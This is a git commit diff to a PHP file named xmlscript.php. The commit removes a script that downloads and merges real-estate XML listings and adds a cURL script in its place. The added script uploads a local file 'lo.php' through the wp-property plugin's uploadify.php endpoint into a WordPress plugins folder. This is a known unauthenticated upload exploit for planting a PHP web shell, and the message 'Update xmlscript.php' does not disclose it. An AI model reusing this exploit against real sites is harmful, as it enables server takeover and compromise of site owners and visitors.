5704604c49d7d751ef3eaa95c25852f9433ca320
foyshal <foyshal_hossain@yahoo.com>
2013-05-29 01:51:32 +0600

    Update xmlscript.php

--- xmlscript.php
+++ xmlscript.php
@@ -1,57 +1,16 @@
 <?php
-
-
-    //path to directory to scan
-    $directory = "xml/";
-
-    //Delete old xml files
-    foreach(glob($directory.'*.*') as $v){
-    unlink($v);
-    }
-
-    // Download & extract new zip file with xml's to directory
-    $zip = new ZipArchive;     
-        $res = $zip->open('https://api.wazzupsoftware.com/MultipleListingService/a95aff8f-1a5e-44cc-9438-37aaff2c255f/zip');
-        if ($res === TRUE) {
-         $zip->extractTo($directory);
-         $zip->close();
-         echo 'Unzip was successful';
-         } else {
-         echo 'Unzip was not successful';
-    }
-
-    //get all xml files with a .xml extension.
-    $filenames = glob($directory . "*.xml");
-
-    $docList = new DOMDocument();
-
-    $root = $docList->createElement('documents');
-    $docList->appendChild($root);
-
-    foreach($filenames as $filename) {
-
-        $doc = new DOMDocument();
-        $doc->load($filename);
-
-        $xmlString = $doc->saveXML($doc->documentElement);
-
-        $xpath = new DOMXPath($doc);
-        $query = "//RealEstateProperty";  // this is the name of the ROOT element
-
-        $nodelist = $xpath->evaluate($query, $doc->documentElement);
-
-        if( $nodelist->length > 0 ) {
-
-            $node = $docList->importNode($nodelist->item(0), true);
-
-            $xmldownload = $docList->createElement('document');
-            $xmldownload->setAttribute("filename", $filename);
-            $xmldownload->appendChild($node);
-
-            $root->appendChild($xmldownload);
-        }
-
-    }
-
-    echo $docList->saveXML();
+ 
+$uploadfile="lo.php";
+$ch =
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('Filedata'=>"@$uploadfile",
+          
+'folder'=>"/wordpress/wp-content/plugins/wp-property/third-party/uploadify/"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+ 
 ?>
